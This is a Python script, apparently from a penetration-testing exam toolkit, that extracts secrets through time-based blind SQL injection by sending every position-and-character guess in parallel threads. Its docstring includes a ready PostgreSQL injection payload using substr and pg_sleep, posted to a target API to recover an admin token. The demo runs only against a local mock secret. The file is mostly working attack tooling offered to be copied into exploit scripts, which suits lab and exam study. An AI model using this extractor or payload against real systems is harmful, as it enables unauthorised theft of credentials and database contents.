#!/usr/bin/env python3
"""
Blind SQLi extractor with parallel worker threads.

Extracts a string of known length by firing ALL (position, character) combinations
simultaneously via a thread pool, then collecting whichever character returned True
at each position.

This is significantly faster than sequential testing — a 64-char string against a
94-char charset (a-zA-Z0-9 + punctuation) fires 6016 tasks total, but only max_workers run at once.

Usage (copy extract_string_blind into your exploit script):
    import requests, time

    session = requests.Session()

    def my_check(index: int, char: str) -> bool:
        # Replace this with your actual blind SQLi logic.
        # Return True if char is correct at position index (1-based).
        sqli = f"(SELECT CASE WHEN (substr((SELECT secret FROM tbl LIMIT 1),{index},1)=$${char}$$) THEN pg_sleep(3) ELSE NULL END)"
        t0 = time.time()
        session.post(TARGET + "/api/" + sqli, data={"apiKey": apikey})
        return time.time() - t0 >= 3   # True = time delay observed = correct char

    result = extract_string_blind(my_check, length=64, label="admin token")
    print(f"Extracted: {result}")
"""

import concurrent.futures
import string
import sys
import time

# ==============================================================================
# PARALLEL BLIND EXTRACTOR
# ==============================================================================

def extract_string_blind(
    check_fn,
    length: int,
    charset: str = string.ascii_letters + string.digits + string.punctuation,
    max_workers: int = 30,
    label: str = "value",
) -> str:
    """
    Extract a fixed-length string via blind SQLi using parallel threads.

    Args:
        check_fn    : callable(index: int, char: str) -> bool
                      Your blind SQLi function. Return True if `char` is correct
                      at 1-based position `index`.
        length      : Number of characters to extract.
        charset     : Characters to test at each position.
        max_workers : Thread pool size. 30 worked well on the exam.
        label       : Display label shown in the progress line.

    Returns:
        The extracted string.

    Notes:
        - All (index, char) tasks are submitted upfront; the pool caps concurrency.
        - Thread-safe: results dict is only written once per index (first True wins).
        - Progress is printed in-place with \\r so the terminal stays clean.
    """
    results: dict[int, str] = {}
    display: list[str] = []

    def worker(index: int, char: str) -> None:
        if check_fn(index, char):
            if index not in results:           # first True at this position wins
                results[index] = char
                current = "".join(v for _, v in sorted(results.items()))
                display.clear()
                display.extend(current)
                print(f"\r  [+] Extracting {label}: {''.join(display)}", end="", flush=True)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        for index in range(1, length + 1):
            for char in charset:
                executor.submit(worker, index, char)

    print()  # newline after the in-place progress line
    extracted = "".join(results.get(i, "?") for i in range(1, length + 1))
    return extracted


# ==============================================================================
# STANDALONE DEMO
# ==============================================================================

if __name__ == "__main__":
    print("sqli_parallel.py — copy extract_string_blind() into your exploit script.")
    print()

    # Mock secret: 12-char mix of upper/lower/digits/punctuation.
    SECRET  = "aB3$xK9!mP2#"
    CHARSET = string.ascii_letters + string.digits + string.punctuation

    def demo_check(index: int, char: str) -> bool:
        # Mock a time-based blind SQLi: every request carries network latency,
        # and a correct char triggers the server-side sleep (the signal).
        # index is 1-based (position 1 = first char), matching SQL's substr().
        correct = (char == SECRET[index - 1])
        time.sleep(0.3 if correct else 0.05)
        return correct

    print(f"Extracting a {len(SECRET)}-char token from a mock time-based blind SQLi:")
    print()

    # Without the helper: sequential, one request at a time, stop at first hit.
    t0 = time.time()
    chars = []
    for index in range(1, len(SECRET) + 1):
        for char in CHARSET:
            if demo_check(index, char):
                chars.append(char)
                print(f"\r  [+] Extracting without helper: {''.join(chars)}", end="", flush=True)
                break
    print()
    seq_result = "".join(chars)
    seq_time   = time.time() - t0
    print(f"  [-] Without helper (sequential): {seq_time:5.1f}s  ->  {seq_result}")

    # With the helper: every (index, char) request fired across the thread pool.
    t0 = time.time()
    par_result = extract_string_blind(demo_check, length=len(SECRET), charset=CHARSET, label="with helper")
    par_time   = time.time() - t0
    print(f"  [+] With helper (parallel):      {par_time:5.1f}s  ->  {par_result}")

    print()
    assert seq_result == par_result == SECRET, "Demo failed"
    print(f"  [+] Both correct - the helper was ~{seq_time / par_time:.0f}x faster.")
